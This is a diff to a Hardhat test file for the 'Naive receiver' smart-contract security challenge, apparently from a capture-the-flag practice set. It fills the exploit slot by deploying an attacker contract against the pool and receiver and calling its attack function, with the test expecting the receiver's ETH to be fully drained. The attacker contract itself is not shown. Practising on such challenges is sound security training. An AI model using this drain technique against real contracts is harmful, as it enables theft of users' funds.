@@ -30,12 +30,15 @@ describe('[Challenge] Naive receiver', function () {
     });
 
     it('Exploit', async function () {
-        /** CODE YOUR EXPLOIT HERE */   
+        /** CODE YOUR EXPLOIT HERE */
+        const AttackFactory = await ethers.getContractFactory("NaiveReceiverAttacker",attacker);
+        let attackerContract = await AttackFactory.deploy(this.pool.address,this.receiver.address);
+        let sigAttackerContract = attackerContract.connect(attacker);
+        await sigAttackerContract.attack();
     });
 
     after(async function () {
         /** SUCCESS CONDITIONS */
-
         // All ETH has been drained from the receiver
         expect(
             await ethers.provider.getBalance(this.receiver.address)
